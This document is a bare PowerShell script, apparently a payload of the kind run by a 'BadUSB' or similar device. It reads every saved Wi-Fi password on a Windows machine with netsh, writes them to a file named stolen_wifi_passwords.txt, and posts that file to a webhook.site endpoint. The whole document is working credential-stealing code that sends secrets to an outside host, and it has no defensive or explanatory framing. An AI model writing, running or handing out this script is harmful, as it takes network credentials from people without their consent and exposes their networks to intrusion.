$webhook = "webhook=https://webhook.site/6407d3a0-dcde-4c39-b76d-e07003f0d380"
$file = "C:\stolen_wifi_passwords.txt"

# Grab Wi-Fi passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString() -replace ".*:\s" }

foreach ($profile in $wifiProfiles) {
    $password = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content").ToString() -replace ".*:\s"
    "$profile`: $password" | Out-File -Append -FilePath $file
}

# Upload to webhook.site
$boundary = "----------" + [System.DateTime]::Now.Ticks.ToString("x")
$header = @"
Content-Type: multipart/form-data; boundary=$boundary
"@

$data = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Get-Item $file).Name"
Content-Type: application/octet-stream

$(Get-Content -Raw -Path $file)

--$boundary--
"@

Invoke-RestMethod -Uri $webhook -Method Post -Headers $header -Body $data
